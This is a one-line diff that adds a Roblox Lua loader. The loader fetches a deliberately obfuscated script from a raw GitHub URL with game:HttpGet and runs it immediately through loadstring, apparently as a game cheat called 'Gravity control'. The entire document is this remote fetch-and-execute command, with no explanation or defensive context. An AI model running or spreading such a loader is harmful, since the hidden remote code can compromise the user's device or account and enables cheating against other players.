@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAGuyMadeBy-bit/Gravity-control./refs/heads/main/obfuscated_script-1769960306733.lua.txt"))()
